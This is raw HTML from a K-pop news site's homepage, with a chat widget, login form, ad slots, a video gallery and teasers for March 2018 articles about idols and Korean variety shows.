Ts="));</script><link href="https://www.allkpop.com/plugin/chat/src/chat_style.min.css" rel="stylesheet" />
<div style="bottom:0;position: fixed;width: 100%;z-index: 999;">
<div id="r_c">
<div style="position: absolute;margin-top:6px;right:0"><a id="find_friend" href="https://www.allkpop.com/$find_friend" style="margin-top: 5px;z-index: 100;"><i class="fa fa-search"></i> Find Friend(s)</a></div>
<div id="chat_panel" class="chat_panel" data-oc="false">Chat</div>
<div id="effect" style="float:left;width:90%;padding: 0 0 0 10px;height:20vh;display: block;overflow-y: auto;">
<b class="_rt">CHAT ROOMS</b><div id="gchat_rooms"> <div class="gchat_row">
<div class="gchat_list" data-room-id="cm9vbV9pZD0yMDc4||" data-friend="Z2NoYXRfdGl0bGU9S1BPUCBMb3VuZ2UmZGF0YV90eXBlPWcmZGF0YV9hdj0wJmRhdGFfbHY9MA==||" data-type="g">
<div class="gchat_img"><img src="https://www.allkpop.com/imgs/placeholder/commenter-img1.jpg" style="width:20px;"></div>
<div class="gchat_name">KPOP Lounge<span class="gchat_cnt"></span></div>
<div class="gchat_status"><i class="fa fa-circle data-of active" data-of="" style="color: rgb(0, 128, 0);"></i></div>
</div>
</div>
</div> <script>var browser_str='CCBot/2.0 (http://commoncrawl.org/faq/)',ismobile='0',connect_error_cnt=false,cuser_id='',cuser_name='',dav='MjA3OD0wJg==||',ismobile='0',istablet='0',isEdge='',cmi='#',cmp='#',me_friend_list='null',av_til='',gchat_link_flag='',gchat_link_room_id='';</script>
<script type="text/javascript" src="https://www.allkpop.com/plugin/chat/src/chat_js.min.js"></script>
</div>
</div>
<div id="c_s">
<div id="c_e" style="position:fixed;float:right;border: 1px solid #000;width:100px;margin:0 0 0 -120px;bottom:0;"></div>
</div>
</div>

<nav id="main" class="subpage" style="position: fixed;height:30px;">
<div class="wrapper">
<div class="logo" style="height: 30px;">
<a href="/"><img src="/imgs/placeholder/logo_r_w1.png?v=1" style="width:126px;height:30px;"></a>
</div>
<div class="mobile-menu-btn"><i class="fa fa-bars fa-lg"></i></div>
<ol class="main-nav" style="padding-top: 0px;">
<li id="menu_meme"><a href="/meme">Memes</a></li>
<li id="menu_shop"><a href="https://shop.allkpop.com" target="_blank">Shop</a></li>
<li id="menu_forums"><a href="/forum">Forums</a></li>
<li id="menu_jobs"><a href="/jobs">Jobs</a></li>
<li id="menu_tip"><a href="/tips">Submit Tip</a></li>
</ol>
<ol class="log-nav" style="padding-left: 0;padding-top: 0px;margin: 0;">
<li><input id="account" class="account" type="button" value="Login"></li>
</ol>
<div class="login-nav">
<p>Login With</p>
<div id="login-btn-facebook" class="login-btn grid-2 spaced">Facebook</div>
<div id="login-btn-twitter" class="login-btn grid-2 spaced">Twitter</div>
<p>Or Login / Register With Us <span><a href="/forgot_pwd">Forgot Password?</a></span></p>
<div class="login_register_form">
<input id="email_input" class="grid-2 spaced" type="text" name="email" placeholder="E-mail Address">
<input id="password_input" class="grid-2 spaced" type="password" name="u_pass" placeholder="password">
<div class="login_alert_error"></div>
<div class="grid-2 spaced">
<input id="remember_me_check" type="checkbox" name="rememberme" value="rememberme" value="1"> Remember Me
</div>
<div class="grid-2 spaced">
<input id="login-btn" type="button" value="Login">
</div>
<input id="register-btn" type="button" value="Register">
</div>
</div>
<div class="search-nav" alt="Search" title="Search">

<input type="text" name="q" id="s" placeholder="Search">
<i class="search-icon fa fa-search fa-lg"></i>

</div>
<div id="scroll-video" style="position: fixed;top: 51px;width:300px;"></div>
</div>
</nav>
<section class='default ad-space bottom-spacing' style='margin-top: 75px!important;width:100%;display:block!important;'>
<div id='div-gpt-ad-1456251248648-0' style='width:1000px;text-align: center;' adonis-marker>
<script type='text/javascript'>
            googletag.cmd.push(function() { googletag.display('div-gpt-ad-1456251248648-0'); });
            </script>
</div></section><div id="jssor_1" style="position: relative; margin: 0 auto; top: 0px; left: 0px; width: 1000px; height: 620px; overflow: hidden; visibility: hidden;margin-bottom:25px;">

<div data-u="loading" style="position: absolute; top: 0px; left: 0px;">
<div style="filter: alpha(opacity=70); opacity: 0.7; position: absolute; display: block; top: 0px; left: 0px; width: 100%; height: 100%;"></div>
<div style="position:absolute;display:block;background:url('https://www.allkpop.com/plugin/slider/img/loading.gif') no-repeat center center;top:0px;left:0px;width:100%;height:100%;"></div>
</div>
<div data-u="slides" style="cursor: default; position: relative; top: 0px; left: 0px; width: 1000px; height: 500px; ">
<div data-p="144.50" style="display: none;">
<div style="position: absolute;top:350px;padding-left:30px;z-index: 1000;">
<h1><a href="/article/2018/03/fans-try-k-pop-idols-favorite-bizarre-dishes-with-soju" target="_self" style="display:inline!important;float:none!important;background-color: #e6413f;opacity:0.9;">Fans Try K-Pop Idols Favorite (bizarre?) Dishes With Soju!</a></h1>
</div>
<a href='/article/2018/03/fans-try-k-pop-idols-favorite-bizarre-dishes-with-soju' target='_self' class='' style=''><img id='main_feature_1' src='https://www.allkpop.com/upload/2018/03/mf1/16165133/misc.jpg' data-u="image" alt='misc' title='misc'></a> <div data-u="thumb">
<img id='main_feature_thumb_1' src='https://www.allkpop.com/upload/2018/03/mf1/16165133/misc.jpg' style="width:100%;height:100%;" alt='misc' title='misc'> <div class="caption" style="text-shadow:-1px -1px 0 #fff,1px -1px 0 #fff,-1px 1px 0 #fff,1px 1px 0 #fff;">
FANS TRY K-POP IDOLS FAVORITE DISHES </div>
</div>
</div>
<div data-p="144.50" style="display: none;">
<div style="position: absolute;top:350px;padding-left:30px;z-index: 1000;">
<h1><a href="/article/2018/03/meghan-trainor-confesses-her-love-for-k-pop-and-favorite-boy-group-bts" target="_self" style="display:inline!important;float:none!important;background-color: #e6413f;opacity:0.9;">Meghan Trainor confesses her love for K-Pop and favorite boy group BTS</a></h1>
</div>
<a href='/article/2018/03/meghan-trainor-confesses-her-love-for-k-pop-and-favorite-boy-group-bts' target='_self' class='' style=''><img id='main_feature_2' src='https://www.allkpop.com/upload/2018/03/mf2/16164903/bts.jpg' data-u="image" alt='bts' title='bts'></a> <div data-u="thumb">
<img id='main_feature_thumb_2' src='https://www.allkpop.com/upload/2018/03/mf2/16164903/bts.jpg' style="width:100%;height:100%;" alt='bts' title='bts'> <div class="caption" style="text-shadow:-1px -1px 0 #fff,1px -1px 0 #fff,-1px 1px 0 #fff,1px 1px 0 #fff;">
MEGHAN TRAINOR IS A FAN OF BTS </div>
</div>
</div>
<div data-p="144.50" style="display: none;">
<div style="position: absolute;top:350px;padding-left:30px;z-index: 1000;">
<h1><a href="/article/2018/03/shinees-key-unveils-the-results-of-his-unexpected-head-shave" target="_self" style="display:inline!important;float:none!important;background-color: #e6413f;opacity:0.9;">SHINee's Key unveils the results of his unexpected head shave</a></h1>
</div>
<a href='/article/2018/03/shinees-key-unveils-the-results-of-his-unexpected-head-shave' target='_self' class='' style=''><img id='main_feature_3' src='https://www.allkpop.com/upload/2018/03/mf3/17062511/SHINee-Key.jpg' data-u="image" alt='SHINee,Key' title='SHINee,Key'></a> <div data-u="thumb">
<img id='main_feature_thumb_3' src='https://www.allkpop.com/upload/2018/03/mf3/17062511/SHINee-Key.jpg' style="width:100%;height:100%;" alt='SHINee,Key' title='SHINee,Key'> <div class="caption" style="text-shadow:-1px -1px 0 #fff,1px -1px 0 #fff,-1px 1px 0 #fff,1px 1px 0 #fff;">
KEY UNVEILS NEW HAIRSTYLE </div>
</div>
</div>
<div data-p="144.50" style="display: none;">
<div style="position: absolute;top:350px;padding-left:30px;z-index: 1000;">
<h1><a href="/article/2018/03/performances-from-march-17th-show-music-core" target="_self" style="display:inline!important;float:none!important;background-color: #e6413f;opacity:0.9;">Wanna One win #1 + Performances from March 17th 'Show! Music Core'!</a></h1>
</div>
<a href='/article/2018/03/performances-from-march-17th-show-music-core' target='_self' class='' style=''><img id='main_feature_4' src='https://www.allkpop.com/upload/2018/03/mf4/17043624/heyne-kcm-got7-mamamoo-ikon-clc-april-up10tion-cosmic-girls-nct-127-sf9-golden-child-the-east-light.jpg' data-u="image" alt='heyne,kcm,got7,mamamoo,ikon,clc,april,up10tion,cosmic-girls,nct-127,sf9,golden-child,the-east-light' title='heyne,kcm,got7,mamamoo,ikon,clc,april,up10tion,cosmic-girls,nct-127,sf9,golden-child,the-east-light'></a> <div data-u="thumb">
<img id='main_feature_thumb_4' src='https://www.allkpop.com/upload/2018/03/mf4/17043624/heyne-kcm-got7-mamamoo-ikon-clc-april-up10tion-cosmic-girls-nct-127-sf9-golden-child-the-east-light.jpg' style="width:100%;height:100%;" alt='heyne,kcm,got7,mamamoo,ikon,clc,april,up10tion,cosmic-girls,nct-127,sf9,golden-child,the-east-light' title='heyne,kcm,got7,mamamoo,ikon,clc,april,up10tion,cosmic-girls,nct-127,sf9,golden-child,the-east-light'> <div class="caption" style="text-shadow:-1px -1px 0 #fff,1px -1px 0 #fff,-1px 1px 0 #fff,1px 1px 0 #fff;">
WANNA ONE WIN 'SHOW! MUSIC CORE' </div>
</div>
</div>
<div data-p="144.50" style="display: none;">
<div style="position: absolute;top:350px;padding-left:30px;z-index: 1000;">
<h1><a href="/article/2018/03/kang-daniel-is-the-top-ranked-boy-group-member-in-brand-values-for-march-big-bang-take-up-2nd-5th" target="_self" style="display:inline!important;float:none!important;background-color: #e6413f;opacity:0.9;">Kang Daniel is the top ranked boy group member in brand values for March + Big Bang take up 2nd-5th</a></h1>
</div>
<a href='/article/2018/03/kang-daniel-is-the-top-ranked-boy-group-member-in-brand-values-for-march-big-bang-take-up-2nd-5th' target='_self' class='' style=''><img id='main_feature_5' src='https://www.allkpop.com/upload/2018/03/mf5/16214348/Big-Bang-Taeyang-G-Dragon-Daesung-Seungri-kang-daniel.jpg' data-u="image" alt='Big-Bang,Taeyang,G-Dragon,Daesung,Seungri,kang-daniel' title='Big-Bang,Taeyang,G-Dragon,Daesung,Seungri,kang-daniel'></a> <div data-u="thumb">
<img id='main_feature_thumb_5' src='https://www.allkpop.com/upload/2018/03/mf5/16214348/Big-Bang-Taeyang-G-Dragon-Daesung-Seungri-kang-daniel.jpg' style="width:100%;height:100%;" alt='Big-Bang,Taeyang,G-Dragon,Daesung,Seungri,kang-daniel' title='Big-Bang,Taeyang,G-Dragon,Daesung,Seungri,kang-daniel'> <div class="caption" style="text-shadow:-1px -1px 0 #fff,1px -1px 0 #fff,-1px 1px 0 #fff,1px 1px 0 #fff;">
INDIVIDUAL BOY GROUP BRAND VALUES </div>
</div>
</div>
<div data-p="144.50" style="display: none;">
<div style="position: absolute;top:350px;padding-left:30px;z-index: 1000;">
<h1><a href="/article/2018/03/op-ed-the-visual-power-of-ncts-music-videos-part-1" target="_self" style="display:inline!important;float:none!important;background-color: #e6413f;opacity:0.9;">[OP-ED] The visual power of NCT's Music Videos (Part 1)</a></h1>
</div>
<a href='/article/2018/03/op-ed-the-visual-power-of-ncts-music-videos-part-1' target='_self' class='' style=''><img id='main_feature_6' src='https://www.allkpop.com/upload/2018/03/mf6/16220655/nct-nct-u.jpg' data-u="image" alt='nct,nct-u' title='nct,nct-u'></a> <div data-u="thumb">
<img id='main_feature_thumb_6' src='https://www.allkpop.com/upload/2018/03/mf6/16220655/nct-nct-u.jpg' style="width:100%;height:100%;" alt='nct,nct-u' title='nct,nct-u'> <div class="caption" style="text-shadow:-1px -1px 0 #fff,1px -1px 0 #fff,-1px 1px 0 #fff,1px 1px 0 #fff;">
THE VISUAL POWER OF NCT MVS PART 1 </div>
</div>
</div>
</div>
<div data-u="thumbnavigator" class="jssort01" style="position:absolute;top:500px;left:0px;bottom:0px;width:1000px;height:100px;" data-autocenter="1"><div data-u="slides" style="cursor: default;"><div data-u="prototype" class="p"><div class="w"><div data-u="thumbnailtemplate" class="t"></div></div><div class="c"></div></div></div></div>
<span data-u="arrowleft" class="jssora05l" style="top:210px;left:8px;width:40px;height:40px;"></span>
<span data-u="arrowright" class="jssora05r" style="top:210px;right:8px;width:40px;height:40px;"></span>
</div> <div class="grey-bg" style="">
<section id="mobile-social" class="full-width">
<ol class="social">
<li class="facebook"><a href="https://www.facebook.com/allkpop" target="_blank"></a></li>
<li class="twitter"><a href="https://twitter.com/allkpop" target="_blank"></a></li>
<li class="instagram"><a href="https://instagram.com/allkpop" target="_blank"></a></li>
<li class="youtube"><a href="https://www.youtube.com/user/allkpop" target="_blank"></a></li>
<li class="googleplus"><a href="https://plus.google.com/+allkpop/posts" target="_blank"></a></li>
</ol></section>
<section id="additional-content" class="iacp full-width subpage-headline" style="">
<article class='default ad-space list' style='margin: 0 0 40px 0;padding-top: 0px;'>
<div id='div-gpt-ad-1456251248648-1' style='width:1000px;text-align: center;' adonis-marker>
<script type='text/javascript'>
            googletag.cmd.push(function() { googletag.display('div-gpt-ad-1456251248648-1'); });
            </script>
</div></article> <nav class="dual-spacing">
<ol class="options">
<li class="latest" alt="Latest articles" title="Latest articles">The Latest</li>
<li class="trending" alt="Rising stories" title="Rising stories">Trending</li>
 <li class="myfeed" alt="My Feed" title="My Feed">My Feed</li>
</ol>
<ol class="social">
<li class="facebook"><a href="https://www.facebook.com/allkpop" target="_blank"></a></li>
<li class="twitter"><a href="https://twitter.com/allkpop" target="_blank"></a></li>
<li class="instagram"><a href="https://instagram.com/allkpop" target="_blank"></a></li>
<li class="youtube"><a href="https://www.youtube.com/user/allkpop" target="_blank"></a></li>
<li class="googleplus"><a href="https://plus.google.com/+allkpop/posts" target="_blank"></a></li>
</ol> </nav>
<div class="meme_src" style="width: 100%;">
<div id="article-headline-left">
<article class="list">
<div class="image">
<a href='/article/2018/03/wheesung-reveals-he-bought-his-manager-a-luxury-car' target='_self' class='' style=''><img id='' src='https://www.allkpop.com/upload/2018/03/af/17102259/wheesung.jpg' style="max-width:1000px;width:200px;height:140px" alt='wheesung' title='wheesung'></a> </div>
<div class="text">
<h2>
<a href='/category/Variety' target='_self' class='' style=''>Variety</a> </h2>
<h1><a href='/article/2018/03/wheesung-reveals-he-bought-his-manager-a-luxury-car' target='_self' class='' style=''>Wheesung reveals he bought his manager a luxury car</a></h1>
<p>Wheesung revealed he bought his manager a luxury car on 'Knowing Brothers'. On the March 17th installment of the show, Kang Ha Na and Wheesung feature…</p>
<div class="info">
elliefilet&nbsp;&nbsp;
<i class="fa fa-clock-o"></i> <span class="realtime" data-ts="1521296862">10 minutes ago</span>&nbsp;&nbsp;
<i class="fa fa-eye"></i> 440&nbsp;&nbsp;
<i class="fa fa-share-square-o"></i> 41&nbsp;&nbsp;
<i class="fa fa-comment-o"></i> 0
</div>
</div>
</article>
<article class="list">
<div class="image">
<a href='/article/2018/03/monsta-x-drop-last-target-teaser-images-for-the-connect' target='_self' class='' style=''><img id='' src='https://www.allkpop.com/upload/2018/03/af/17091546/monsta-x-hyungwon.jpg' style="max-width:1000px;width:200px;height:140px" alt='monsta-x,hyungwon' title='monsta-x,hyungwon'></a> </div>
<div class="text">
<h2>
<a href='/category/Music-Releases' target='_self' class='' style=''>Music Releases</a> </h2>
<h1><a href='/article/2018/03/monsta-x-drop-last-target-teaser-images-for-the-connect' target='_self' class='' style=''>MONSTA X drop last target teaser images for 'The Connect'</a></h1>
<p>MONSTA X have dropped the last 'target' concept teaser images for their upcoming album 'The Connect'.Following Shownu & I.M, Wonho & Jooheon, and Kihy…</p>
<div class="info">
elliefilet&nbsp;&nbsp;
<i class="fa fa-clock-o"></i> <span class="realtime" data-ts="1521293400">1 hour ago</span>&nbsp;&nbsp;
<i class="fa fa-eye"></i> 1,415&nbsp;&nbsp;
<i class="fa fa-share-square-o"></i> 358&nbsp;&nbsp;
 <i class="fa fa-comment-o"></i> 0
</div>
</div>
</article>
<article class="list"><script async src="https://www.allkpop.com/plugin/youtube_gallery/js/jquery.nicescroll.min.js"></script>
<link rel="stylesheet" href="https://www.allkpop.com/plugin/youtube_gallery/css/feed_scroll.css?v=23" />
<div id="youtube" class="spidochetube" style="width:100%;display:inline-block;"><div class="spidochetube_inner"><ul id="spidochetube_list" class="scrollbar" tabindex="0"><li class="spidochetube_current"><a title="Fans Try K-Pop Idols Favorite (bizarre?) Dishes With Soju!" data-youtubeid="o59r_fQdFZI">
<img src="https://i.ytimg.com/vi/o59r_fQdFZI/mqdefault.jpg" alt="Fans Try K-Pop Idols Favorite (bizarre?) Dishes With Soju!">
<span>Fans Try K-Pop Idols Favorite (bizarre?) Dishes With Soju!</span>
</a>
</li><li><a title="Hilarious moments when idols imitated one another" data-youtubeid="lAI96GoVIW4">
<img src="https://i.ytimg.com/vi/lAI96GoVIW4/mqdefault.jpg" alt="Hilarious moments when idols imitated one another">
<span>Hilarious moments when idols imitated one another</span>
</a>
</li><li><a title="Most popular idols' birth names" data-youtubeid="Tat1FbXGMJg">
<img src="https://i.ytimg.com/vi/Tat1FbXGMJg/mqdefault.jpg" alt="Most popular idols' birth names">
<span>Most popular idols' birth names</span>
</a>
</li><li><a title="7 Times Fans Got Kissed by an Idol" data-youtubeid="3cFQHpSrOeY">
<img src="https://i.ytimg.com/vi/3cFQHpSrOeY/mqdefault.jpg" alt="7 Times Fans Got Kissed by an Idol">
<span>7 Times Fans Got Kissed by an Idol</span>
</a>
</li><li><a title="10 Idols with unique beauty marks" data-youtubeid="177Xr6xTGU0">
<img src="https://i.ytimg.com/vi/177Xr6xTGU0/mqdefault.jpg" alt="10 Idols with unique beauty marks">
<span>10 Idols with unique beauty marks</span>
</a>
</li><li><a title="The hottest mixed race Korean celebrities" data-youtubeid="FOQRevjWFw8">
<img src="https://i.ytimg.com/vi/FOQRevjWFw8/mqdefault.jpg" alt="The hottest mixed race Korean celebrities">
<span>The hottest mixed race Korean celebrities</span>
</a>
</li><li><a title="Male idols who rocked the cross-dressing look" data-youtubeid="rSqkuWnkH9I">
<img src="https://i.ytimg.com/vi/rSqkuWnkH9I/mqdefault.jpg" alt="Male idols who rocked the cross-dressing look">
<span>Male idols who rocked the cross-dressing look</span>
</a>
</li><li><a title="Male Idols Who Proved Tattoos Are Hot" data-youtubeid="nrYUDXa8gRY">
<img src="https://i.ytimg.com/vi/nrYUDXa8gRY/mqdefault.jpg" alt="Male Idols Who Proved Tattoos Are Hot">
<span>Male Idols Who Proved Tattoos Are Hot</span>
</a>
</li><li><a title="Suzy and Lee Dong Wook are dating!" data-youtubeid="vricu3KbZhk">
<img src="https://i.ytimg.com/vi/vricu3KbZhk/mqdefault.jpg" alt="Suzy and Lee Dong Wook are dating!">
<span>Suzy and Lee Dong Wook are dating!</span>
</a>
</li><li><a title="Most emotional reactions from groups receiving their first win" data-youtubeid="TnpLebq7sr8">
<img src="https://i.ytimg.com/vi/TnpLebq7sr8/mqdefault.jpg" alt="Most emotional reactions from groups receiving their first win">
<span>Most emotional reactions from groups receiving their first win</span>
</a>
</li><li><a title="It's only March and how many celeb couples went public with dating news this year?" data-youtubeid="hZSHLREE66A">
<img src="https://i.ytimg.com/vi/hZSHLREE66A/mqdefault.jpg" alt="It's only March and how many celeb couples went public with dating news this year?">
<span>It's only March and how many celeb couples went public with dating news this year?</span>
</a>
</li><li><a title="The Definitive List of the Most Important K-Pop Songs of All Time" data-youtubeid="6f-jNZwHOfg">
<img src="https://i.ytimg.com/vi/6f-jNZwHOfg/mqdefault.jpg" alt="The Definitive List of the Most Important K-Pop Songs of All Time">
<span>The Definitive List of the Most Important K-Pop Songs of All Time</span>
</a>
</li><li><a title="7 Reasons Big Bang is a Truly Admirable Group" data-youtubeid="IToHffzGV-E">
<img src="https://i.ytimg.com/vi/IToHffzGV-E/mqdefault.jpg" alt="7 Reasons Big Bang is a Truly Admirable Group">
<span>7 Reasons Big Bang is a Truly Admirable Group</span>
</a>
</li><li><a title="Idol stars who still look remarkably the same to their baby photos" data-youtubeid="cJQlpsWrDtU">
<img src="https://i.ytimg.com/vi/cJQlpsWrDtU/mqdefault.jpg" alt="Idol stars who still look remarkably the same to their baby photos">
<span>Idol stars who still look remarkably the same to their baby photos</span>
</a>
</li><li><a title="10 Idols who are mistaken as leaders in their group" data-youtubeid="PfFcCn8lhHE">
<img src="https://i.ytimg.com/vi/PfFcCn8lhHE/mqdefault.jpg" alt="10 Idols who are mistaken as leaders in their group">
<span>10 Idols who are mistaken as leaders in their group</span>
</a>
</li><li><a title="10 K-Pop Idols with the Highest Net Worth" data-youtubeid="L-5IVHtpbeo">
<img src="https://i.ytimg.com/vi/L-5IVHtpbeo/mqdefault.jpg" alt="10 K-Pop Idols with the Highest Net Worth">
<span>10 K-Pop Idols with the Highest Net Worth</span>
</a>
</li><li><a title="Awesome K Pop Cosplays" data-youtubeid="RpdAQ2zHNdE">
<img src="https://i.ytimg.com/vi/RpdAQ2zHNdE/mqdefault.jpg" alt="Awesome K Pop Cosplays">
<span>Awesome K Pop Cosplays</span>
</a>
</li><li><a title="10 Scariest Sasaeng Stories" data-youtubeid="DOFNaQwmiLA">
<img src="https://i.ytimg.com/vi/DOFNaQwmiLA/mqdefault.jpg" alt="10 Scariest Sasaeng Stories">
<span>10 Scariest Sasaeng Stories</span>
</a>
</li><li><a title="10 Sexy K-Pop dance practices that will make you swoon" data-youtubeid="5bkKJHoWXkY">
<img src="https://i.ytimg.com/vi/5bkKJHoWXkY/mqdefault.jpg" alt="10 Sexy K-Pop dance practices that will make you swoon">
<span>10 Sexy K-Pop dance practices that will make you swoon</span>
</a>
</li><li><a title="K-Pop's One Hit Wonders" data-youtubeid="F-l9I6ZLYUY">
<img src="https://i.ytimg.com/vi/F-l9I6ZLYUY/mqdefault.jpg" alt="K-Pop's One Hit Wonders">
<span>K-Pop's One Hit Wonders</span>
</a>
</li></ul><div id="spidochetube_player"><iframe id="player" src="https://www.youtube.com/embed/o59r_fQdFZI" width="640" height="360" frameborder="0" allowfullscreen="" style=""></iframe></div></div></div><script>$(document).ready(function(){$('.yt_scr').css({'width':Number($('.grey-bg').width()-50)+'px'});$(window).bind("resize", function(){$('.yt_scr').css({'width':Number($('.grey-bg').width()-50)+'px'});});$(window).bind("orientationchange", function(){$('.yt_scr').css({'width':Number($('.grey-bg').width()-50)+'px'});});$('#spidochetube_list').niceScroll({cursorcolor  : '#d80001',cursorborder : '0px solid #fff',autohidemode : false});$('#spidochetube_list li').on('click',function(e){var youtubeid=$(this).find('a').attr('data-youtubeid');$('#spidochetube_player iframe').attr('src','https://www.youtube.com/embed/'+youtubeid+'');$('#spidochetube_list li').removeClass('spidochetube_current');$(this).addClass('spidochetube_current');});$('#ascrail2000-hr').css({'z-index':'1'});});</script>
</article> <article class="list">
<div class="image">
<a href='/article/2018/03/hara-suggests-seungri-as-next-seoulmate-host' target='_self' class='' style=''><img id='' src='https://www.allkpop.com/upload/2018/03/af/17082645/Seungri-Hara.jpg' style="max-width:1000px;width:200px;height:140px" alt='Seungri,Hara' title='Seungri,Hara'></a> </div>
<div class="text">
<h2>
<a href='/category/Variety' target='_self' class='' style=''>Variety</a> </h2>
<h1><a href='/article/2018/03/hara-suggests-seungri-as-next-seoulmate-host' target='_self' class='' style=''>Hara suggests Seungri as next 'Seoulmate' host</a></h1>
<p>Hara suggested Big Bang's Seungri as a host on tvN's reality show 'Seoulmate'.&nbsp;On the March 17 episode, Kim Sook&nbsp;expressed, "'Seoulmate' is …</p>
<div class="info">
elliefilet&nbsp;&nbsp;
<i class="fa fa-clock-o"></i> <span class="realtime" data-ts="1521290103">2 hours ago</span>&nbsp;&nbsp;
<i class="fa fa-eye"></i> 2,363&nbsp;&nbsp;
<i class="fa fa-share-square-o"></i> 787&nbsp;&nbsp;
<i class="fa fa-comment-o"></i> 5
</div>
</div>
</article>
<article class="list">
<div class="image">
<a href='/article/2018/03/yoo-jae-suk-and-park-myung-soo-tear-up-over-their-last-days-on-infinity-challenge' target='_self' class='' style=''><img id='' src='https://www.allkpop.com/upload/2018/03/af/17073300/Yoo-Jae-Suk-park-myung-soo.jpg' style="max-width:1000px;width:200px;height:140px" alt='Yoo-Jae-Suk,park-myung-soo' title='Yoo-Jae-Suk,park-myung-soo'></a> </div>
<div class="text">
<h2>
<a href='/category/Variety' target='_self' class='' style=''>Variety</a> </h2>
<h1><a href='/article/2018/03/yoo-jae-suk-and-park-myung-soo-tear-up-over-their-last-days-on-infinity-challenge' target='_self' class='' style=''>Yoo Jae Suk and Park Myung Soo tear up over their last days on 'Infinity Challenge'</a></h1>
<p>Yoo Jae Suk and Park Myung Soo teared up over their final days on MBC's 'Infinity Challenge'.On the March 17th installment of the MBC&nbsp;variety sho…</p>
<div class="info">
elliefilet&nbsp;&nbsp;
 <i class="fa fa-clock-o"></i> <span class="realtime" data-ts="1521286851">3 hours ago</span>&nbsp;&nbsp;
<i class="fa fa-eye"></i> 9,780&nbsp;&nbsp;
<i class="fa fa-share-square-o"></i> 1,576&nbsp;&nbsp;
<i class="fa fa-comment-o"></i> 11
</div>
</div>
</article>
<article class='default ad-space list' style='padding: 25px 0;border-bottom: 1px solid #CCC;'>
<div id='div-gpt-ad-1456251248648-2' style='width:640px;text-align: center;' adonis-marker>
<script type='text/javascript'>
            googletag.cmd.push(function() { googletag.display('div-gpt-ad-1456251248648-2'); });
            </script>
</div></article> <article class="list">
<div class="image">
<a href='/article/2018/03/shinees-key-unveils-the-results-of-his-unexpected-head-shave' target='_self' class='' style=''><img id='' src='https://www.allkpop.com/upload/2018/03/af/17062349/SHINee-Key.jpg' style="max-width:1000px;width:200px;height:140px" alt='SHINee,Key' title='SHINee,Key'></a> </div>
<div class="text">
<h2>
<a href='/category/Social-Media' target='_self' class='' style=''>Social Media</a> </h2>
<h1><a href='/article/2018/03/shinees-key-unveils-the-results-of-his-unexpected-head-shave' target='_self' class='' style=''>SHINee's Key unveils the results of his unexpected head shave</a></h1>
<p>SHINee's Key has unveiled the results of his unexpected head shave! On March 16, Key surprised fans with a video of himself taking an electric shaver …</p>
<div class="info">
elliefilet&nbsp;&nbsp;
<i class="fa fa-clock-o"></i> <span class="realtime" data-ts="1521282602">4 hours ago</span>&nbsp;&nbsp;
<i class="fa fa-eye"></i> 20,738&nbsp;&nbsp;
<i class="fa fa-share-square-o"></i> 1,943&nbsp;&nbsp;
<i class="fa fa-comment-o"></i> 33
</div>
</div>
</article>
<article class="list">
<div class="image">
<a href='/article/2018/03/highlights-yoseob-reveals-special-bts-video-for-end-of-2nd-mini-album-promotions' target='_self' class='embed_on' style=''><img id='' src='https://www.allkpop.com/upload/2018/03/af/17054853/highlight-yoseob.jpg' style="max-width:1000px;width:200px;height:140px" alt='highlight,yoseob' title='highlight,yoseob'></a> </div>
<div class="text">
<h2>
<a href='/category/General' target='_self' class='' style=''>General</a> </h2>
<h1><a href='/article/2018/03/highlights-yoseob-reveals-special-bts-video-for-end-of-2nd-mini-album-promotions' target='_self' class='' style=''>Highlight's Yoseob reveals special bts video for end of 2nd mini album promotions</a></h1>
<p>Highlight's Yoseob has completed promotions for his 2nd mini album `白`, and fans get another special behind-the-scenes video!
He's already said 'bye …</p>
<div class="info">
elliefilet&nbsp;&nbsp;
<i class="fa fa-clock-o"></i> <span class="realtime" data-ts="1521280536">5 hours ago</span>&nbsp;&nbsp;
<i class="fa fa-eye"></i> 1,872&nbsp;&nbsp;
<i class="fa fa-share-square-o"></i> 461&nbsp;&nbsp;
<i class="fa fa-comment-o"></i> 0
</div>
</div>
</article>
<article class="list">
<div class="image">
<a href='/article/2018/03/shin-dong-yup-goes-indiana-jones-and-leads-hyeri-key-more-in-official-amazing-saturday-poster' target='_self' class='' style=''><img id='' src='https://www.allkpop.com/upload/2018/03/af/17013855/Hyeri-Key-shin-dong-yup-park-na-rae.jpg' style="max-width:1000px;width:200px;height:140px" alt='Hyeri,Hanhae,Key,shin-dong-yup,boom,park-na-rae' title='Hyeri,Hanhae,Key,shin-dong-yup,boom,park-na-rae'></a> </div>
<div class="text">
<h2>
<a href='/category/Variety' target='_self' class='' style=''>Variety</a> </h2>
<h1><a href='/article/2018/03/shin-dong-yup-goes-indiana-jones-and-leads-hyeri-key-more-in-official-amazing-saturday-poster' target='_self' class='' style=''>Shin Dong Yup goes Indiana Jones and leads Hyeri, Key, & more in official 'Amazing Saturday' poster</a></h1>
<p>Are you ready for an 'Amazing Saturday'?tvN's newest Saturday variety show has released an official poster of the MC cast, who took on an Indiana Jone…</p>
<div class="info">
beansss&nbsp;&nbsp;
<i class="fa fa-clock-o"></i> <span class="realtime" data-ts="1521276464">6 hours ago</span>&nbsp;&nbsp;
<i class="fa fa-eye"></i> 2,225&nbsp;&nbsp;
<i class="fa fa-share-square-o"></i> 433&nbsp;&nbsp;
<i class="fa fa-comment-o"></i> 6
</div>
</div>
</article>
<article class="list">
<div class="image">
<a href='/article/2018/03/performances-from-march-17th-show-music-core' target='_self' class='' style=''><img id='' src='https://www.allkpop.com/upload/2018/03/af/17043653/heyne-kcm-got7-mamamoo-ikon-clc-april-up10tion-cosmic-girls-nct-127-sf9-golden-child-the-east-light.jpg' style="max-width:1000px;width:200px;height:140px" alt='heyne,kcm,got7,mamamoo,ikon,clc,april,up10tion,cosmic-girls,nct-127,sf9,golden-child,the-east-light' title='heyne,kcm,got7,mamamoo,ikon,clc,april,up10tion,cosmic-girls,nct-127,sf9,golden-child,the-east-light'></a> </div>
<div class="text">
<h2>
<a href='/category/Music-Shows' target='_self' class='' style=''>Music Shows</a> </h2>
<h1><a href='/article/2018/03/performances-from-march-17th-show-music-core' target='_self' class='' style=''>Wanna One win #1 + Performances from March 17th 'Show! Music Core'!</a></h1>
<p>MBC's 'Show! Music Core' is back for its weekly show featuring performances by your favorite artists! On this episode, GOT7 made a comeback with "Look…</p>
<div class="info">
elliefilet&nbsp;&nbsp;
<i class="fa fa-clock-o"></i> <span class="realtime" data-ts="1521273600">7 hours ago</span>&nbsp;&nbsp;
<i class="fa fa-eye"></i> 13,345&nbsp;&nbsp;
<i class="fa fa-share-square-o"></i> 3,658&nbsp;&nbsp;
